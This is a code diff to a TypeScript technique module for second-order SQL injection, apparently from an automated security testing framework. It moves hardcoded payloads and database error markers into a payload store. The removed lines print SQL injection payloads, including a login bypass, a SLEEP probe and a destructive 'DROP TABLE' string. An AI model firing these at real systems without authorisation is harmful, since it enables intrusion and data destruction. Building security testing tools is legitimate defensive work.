@@ -12,9 +12,9 @@ import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionRes
 import { claimFor } from './framework'
 import { EvidenceGate } from '../intelligence/evidence-gate'
 import { observeCompare, observeParse } from './observers'
+import { getPayloadStore } from '../payloads/store'
 
-const SQLI_ERROR_MARKERS = ['sql syntax', 'mysql', 'postgresql', 'sqlite', 'sqlstate', 'ora-', 'syntax error', 'unclosed quotation', 'unknown column']
-const PAYLOADS = ["' OR '1'='1", "1' AND SLEEP(3)-- -", "admin'-- -", "1'); DROP TABLE t-- -"]
+const SQLI_ERROR_MARKERS = () => getPayloadStore().getMarkers('sqli/second-order')
 
 function urlWithParam(url: string, param: string, value: string): string {
   try { const u = new URL(url); u.searchParams.set(param, value); return u.toString() } catch { return url }
@@ -36,7 +36,8 @@ export const secondOrderSqli: TechniquePrimitive = {
     const triggerParam = String(ctx.state?.triggerParam ?? 'id')
     const headers = { ...(ctx.sessionHeaders ?? {}) }
     const steps: AttackStep[] = []
-    for (const p of PAYLOADS) {
+    const payloads = ctx.payloadSet ?? getPayloadStore().getPayloads('sqli/second-order')
+    for (const p of payloads) {
       // Stage 1: store payload.
       steps.push({
         id: `so-store-${steps.length}`,
@@ -62,9 +63,10 @@ export const secondOrderSqli: TechniquePrimitive = {
     const evidence: PrimitiveResult['evidence'] = []
     for (const r of triggers) {
       const lower = (r.body ?? '').toLowerCase()
-      const leaked = SQLI_ERROR_MARKERS.some((m) => lower.includes(m))
+      const markers = SQLI_ERROR_MARKERS()
+      const leaked = markers.some((m) => lower.includes(m))
       const parsed = await observeParse(r.body ?? '', r.headers ?? {}, r.status ?? 0)
-      const errLeak = parsed.textSnippets.some((s) => SQLI_ERROR_MARKERS.some((m) => s.toLowerCase().includes(m)))
+      const errLeak = parsed.textSnippets.some((s) => markers.some((m) => s.toLowerCase().includes(m)))
       if ((leaked || errLeak) && (r.status ?? 500) < 500) {
         hit = true
         evidence.push({ kind: 'response', label: `2nd-order SQLi triggered ${r.step.request.method} ${r.step.request.url} → ${r.status}`, data: (r.body ?? '').slice(0, 1200) })
